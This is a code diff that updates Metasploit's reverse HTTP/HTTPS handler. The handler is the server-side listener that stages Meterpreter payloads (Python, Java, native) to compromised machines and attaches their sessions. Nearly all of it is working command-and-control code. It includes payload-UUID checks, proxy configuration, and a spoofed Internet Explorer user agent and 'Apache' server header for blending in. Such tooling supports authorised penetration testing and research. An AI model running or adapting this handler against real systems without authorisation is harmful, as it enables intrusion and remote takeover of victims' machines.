@@ -1,8 +1,10 @@
 # -*- coding: binary -*-
 require 'rex/io/stream_abstraction'
 require 'rex/sync/ref'
-require 'msf/core/handler/reverse_http/uri_checksum'
-require 'rex/payloads/meterpreter/patch'
+require 'rex/payloads/meterpreter/uri_checksum'
+require 'rex/post/meterpreter'
+require 'rex/parser/x509_certificate'
+require 'msf/core/payload/windows/verify_ssl'
 
 module Msf
 module Handler
@@ -15,7 +17,8 @@ module Handler
 module ReverseHttp
 
   include Msf::Handler
-  include Msf::Handler::ReverseHttp::UriChecksum
+  include Rex::Payloads::Meterpreter::UriChecksum
+  include Msf::Payload::Windows::VerifySsl
 
   #
   # Returns the string representation of the handler type
@@ -47,28 +50,22 @@ module ReverseHttp
     register_advanced_options(
       [
         OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
-        OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcibly shut down', (24*3600*7)]),
-        OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300]),
         OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
         OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
         OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
         OptInt.new('ReverseListenerBindPort', [ false, 'The port to bind to on the local system if different from LPORT' ]),
-        OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ])
+        OptBool.new('OverrideRequestHost', [ false, 'Forces clients to connect to LHOST:LPORT instead of keeping original payload host', false ]),
+        OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ]),
+        OptBool.new('IgnoreUnknownPayloads', [false, 'Whether to drop connections from payloads using unknown UUIDs', false])
       ], Msf::Handler::ReverseHttp)
-  end
-
-  # Toggle for IPv4 vs IPv6 mode
-  #
-  def ipv6?
-    Rex::Socket.is_ipv6?(datastore['LHOST'])
   end
 
   # Determine where to bind the server
   #
   # @return [String]
   def listener_address
-    if datastore['ReverseListenerBindAddress'].to_s.empty?
-      bindaddr = (ipv6?) ? '::' : '0.0.0.0'
+    if datastore['ReverseListenerBindAddress'].to_s == ""
+      bindaddr = Rex::Socket.is_ipv6?(datastore['LHOST']) ? '::' : '0.0.0.0'
     else
       bindaddr = datastore['ReverseListenerBindAddress']
     end
@@ -76,14 +73,12 @@ module ReverseHttp
     bindaddr
   end
 
+  # Return a URI suitable for placing in a payload
+  #
   # @return [String] A URI of the form +scheme://host:port/+
   def listener_uri
-    if ipv6?
-      listen_host = "[#{listener_address}]"
-    else
-      listen_host = listener_address
-    end
-    "#{scheme}://#{listen_host}:#{datastore['LPORT']}/"
+    uri_host = Rex::Socket.is_ipv6?(listener_address) ? "[#{listener_address}]" : listener_address
+    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
   end
 
   # Return a URI suitable for placing in a payload.
@@ -92,13 +87,15 @@ module ReverseHttp
   # addresses.
   #
   # @return [String] A URI of the form +scheme://host:port/+
-  def payload_uri
-    if ipv6?
-      callback_host = "[#{datastore['LHOST']}]"
+  def payload_uri(req)
+    if req and req.headers and req.headers['Host'] and not datastore['OverrideRequestHost']
+      callback_host = req.headers['Host']
+    elsif Rex::Socket.is_ipv6?(datastore['LHOST'])
+      callback_host = "[#{datastore['LHOST']}]:#{datastore['LPORT']}"
     else
-      callback_host = datastore['LHOST']
+      callback_host = "#{datastore['LHOST']}:#{datastore['LPORT']}"
     end
-    "#{scheme}://#{callback_host}:#{datastore['LPORT']}/"
+    "#{scheme}://#{callback_host}/"
   end
 
   # Use the {#refname} to determine whether this handler uses SSL or not
@@ -155,20 +152,11 @@ module ReverseHttp
       'VirtualDirectory' => true)
 
     print_status("Started #{scheme.upcase} reverse handler on #{listener_uri}")
-  end
+    lookup_proxy_settings
 
-  #
-  # Simply calls stop handler to ensure that things are cool.
-  #
-  def cleanup_handler
-    stop_handler
-  end
-
-  #
-  # Basically does nothing.  The service is already started and listening
-  # during set up.
-  #
-  def start_handler
+    if datastore['IgnoreUnknownPayloads']
+      print_status("Handler is ignoring unknown payloads, there are #{framework.uuid_db.keys.length} UUIDs whitelisted")
+    end
   end
 
   #
@@ -176,7 +164,12 @@ module ReverseHttp
   # active on sub-urls.
   #
   def stop_handler
-    self.service.remove_resource("/") if self.service
+    if self.service
+      self.service.remove_resource("/")
+      if self.service.resources.empty? && self.sessions == 0
+        Rex::ServiceManager.stop_service(self.service)
+      end
+    end
   end
 
   attr_accessor :service # :nodoc:
@@ -184,23 +177,102 @@ module ReverseHttp
 protected
 
   #
+  # Parses the proxy settings and returns a hash
+  #
+  def lookup_proxy_settings
+    info = {}
+    return @proxy_settings if @proxy_settings
+
+    if datastore['PayloadProxyHost'].to_s == ""
+      @proxy_settings = info
+      return @proxy_settings
+    end
+
+    info[:host] = datastore['PayloadProxyHost'].to_s
+    info[:port] = (datastore['PayloadProxyPort'] || 8080).to_i
+    info[:type] = datastore['PayloadProxyType'].to_s
+
+    uri_host = info[:host]
+
+    if Rex::Socket.is_ipv6?(uri_host)
+      uri_host = "[#{info[:host]}]"
+    end
+
+    info[:info] = "#{uri_host}:#{info[:port]}"
+
+    if info[:type] == "SOCKS"
+      info[:info] = "socks=#{info[:info]}"
+    else
+      info[:info] = "http://#{info[:info]}"
+      if datastore['PayloadProxyUser'].to_s != ""
+        info[:username] = datastore['PayloadProxyUser'].to_s
+      end
+      if datastore['PayloadProxyPass'].to_s != ""
+        info[:password] = datastore['PayloadProxyPass'].to_s
+      end
+    end
+
+    @proxy_settings = info
+  end
+
+  #
   # Parses the HTTPS request
   #
   def on_request(cli, req, obj)
     resp = Rex::Proto::Http::Response.new
+    info = process_uri_resource(req.relative_resource)
+    uuid = info[:uuid] || Msf::Payload::UUID.new
 
-    print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
+    # Configure the UUID architecture and payload if necessary
+    uuid.arch      ||= obj.arch
+    uuid.platform  ||= obj.platform
 
-    uri_match = process_uri_resource(req.relative_resource)
+    conn_id = nil
+    if info[:mode] && info[:mode] != :connect
+      conn_id = generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
+    end
+
+    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
+      print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring request with unknown UUID")
+      info[:mode] = :unknown_uuid
+    end
+
+    # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
+      allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
+      unless allowed_urls.include?(req.relative_resource)
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring request with unknown UUID URL #{req.relative_resource}")
+        info[:mode] = :unknown_uuid_url
+      end
+    end
+
+    self.pending_connections += 1
 
     # Process the requested resource.
-    case uri_match
-      when /^\/INITPY/
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        url = payload_uri + conn_id + '/'
+    case info[:mode]
+      when :init_connect
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Redirecting stageless connection ...")
+
+        # Handle the case where stageless payloads call in on the same URI when they
+        # first connect. From there, we tell them to callback on a connect URI that
+        # was generated on the fly. This means we form a new session for each.
+
+        # Hurl a TLV back at the caller, and ignore the response
+        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
+                                                 'core_patch_url')
+        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
+        resp.body = pkt.to_r
+
+      when :init_python
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
+        url = payload_uri(req) + conn_id + '/'
 
         blob = ""
-        blob << obj.generate_stage
+        blob << obj.generate_stage(
+          uuid: uuid,
+          uri:  conn_id
+        )
 
         var_escape = lambda { |txt|
           txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
@@ -208,12 +280,10 @@ protected
 
         # Patch all the things
         blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
-        blob.sub!('HTTP_EXPIRATION_TIMEOUT = 604800', "HTTP_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
-        blob.sub!('HTTP_COMMUNICATION_TIMEOUT = 300', "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
         blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
 
-        unless datastore['PROXYHOST'].blank?
-          proxy_url = "http://#{datastore['PROXYHOST']}:#{datastore['PROXYPORT']}"
+        unless datastore['PayloadProxyHost'].blank?
+          proxy_url = "http://#{datastore['PayloadProxyHost']||datastore['PROXYHOST']}:#{datastore['PayloadProxyPort']||datastore['PROXYPORT']}"
           blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
         end
 
@@ -226,24 +296,20 @@ protected
           :url                => url,
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
           :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :retry_total        => datastore['SessionRetryTotal'].to_i,
+          :retry_wait         => datastore['SessionRetryWait'].to_i,
           :ssl                => ssl?,
+          :payload_uuid       => uuid
         })
 
-      when /^\/INITJM/
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        url = payload_uri + conn_id + "/\x00"
+      when :init_java
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Java payload ...")
+        url = payload_uri(req) + conn_id + "/\x00"
 
-        blob = ""
-        blob << obj.generate_stage
-
-        # This is a TLV packet - I guess somewhere there should be an API for building them
-        # in Metasploit :-)
-        packet = ""
-        packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
-        packet << [url.length+8, 0x1000a].pack('NN')+url
-        packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
-        packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
-        blob << [packet.length+8, 0].pack('NN') + packet
+        blob = obj.generate_stage(
+          uuid: uuid,
+          uri:  conn_id
+        )
 
         resp.body = blob
 
@@ -254,32 +320,24 @@ protected
           :url                => url,
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
           :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-          :ssl                => ssl?
+          :retry_total        => datastore['SessionRetryTotal'].to_i,
+          :retry_wait         => datastore['SessionRetryWait'].to_i,
+          :ssl                => ssl?,
+          :payload_uuid       => uuid
         })
 
-      when /^\/A?INITM?/
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        url = payload_uri + conn_id + "/\x00"
+      when :init_native
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Native payload ...")
+        url = payload_uri(req) + conn_id + "/\x00"
 
-        print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
         resp['Content-Type'] = 'application/octet-stream'
 
-        blob = obj.stage_payload
-
-        #
-        # Patch options into the payload
-        #
-        Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
-          :ssl            => ssl?,
-          :url            => url,
-          :expiration     => datastore['SessionExpirationTimeout'],
-          :comm_timeout   => datastore['SessionCommunicationTimeout'],
-          :ua             => datastore['MeterpreterUserAgent'],
-          :proxyhost      => datastore['PROXYHOST'],
-          :proxyport      => datastore['PROXYPORT'],
-          :proxy_type     => datastore['PROXY_TYPE'],
-          :proxy_username => datastore['PROXY_USERNAME'],
-          :proxy_password => datastore['PROXY_PASSWORD']
+        # generate the stage, but pass in the existing UUID and connection id so that
+        # we don't get new ones generated.
+        blob = obj.stage_payload(
+          uuid: uuid,
+          uri:  conn_id
+        )
 
         resp.body = encode_stage(blob)
 
@@ -290,31 +348,42 @@ protected
           :url                => url,
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
           :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :retry_total        => datastore['SessionRetryTotal'].to_i,
+          :retry_wait         => datastore['SessionRetryWait'].to_i,
           :ssl                => ssl?,
+          :payload_uuid       => uuid
         })
 
-      when /^\/CONN_.*\//
-        resp.body = ""
-        # Grab the checksummed version of CONN from the payload's request.
-        conn_id = req.relative_resource.gsub("/", "")
+      when :connect
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Attaching orphaned/stageless session ...")
 
-        print_status("Incoming orphaned session #{conn_id}, reattaching...")
+        resp.body = ""
+        conn_id = req.relative_resource
 
         # Short-circuit the payload's handle_connection processing for create_session
         create_session(cli, {
           :passive_dispatcher => obj.service,
           :conn_id            => conn_id,
-          :url                => payload_uri + conn_id + "/\x00",
-          :expiration         => datastore['SessionExpirationTimeout'].to_i,
-          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :url                => payload_uri(req) + conn_id + "/\x00",
+          # TODO ### Figure out what to do with these options given that the payload ###
+          # settings might not match the handler, should we instead read the remote?   #
+          :expiration         => datastore['SessionExpirationTimeout'].to_i,           #
+          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,        #
+          :retry_total        => datastore['SessionRetryTotal'].to_i,                  #
+          :retry_wait         => datastore['SessionRetryWait'].to_i,                   #
+          ##############################################################################
           :ssl                => ssl?,
+          :payload_uuid       => uuid
         })
 
       else
-        print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
+        unless [:unknown_uuid, :unknown_uuid_url].include?(info[:mode])
+          print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{req.relative_resource} with UA #{req.headers['User-Agent']}...")
+        end
         resp.code    = 200
         resp.message = "OK"
         resp.body    = datastore['HttpUnknownRequestResponse'].to_s
+        self.pending_connections -= 1
     end
 
     cli.send_response(resp) if (resp)
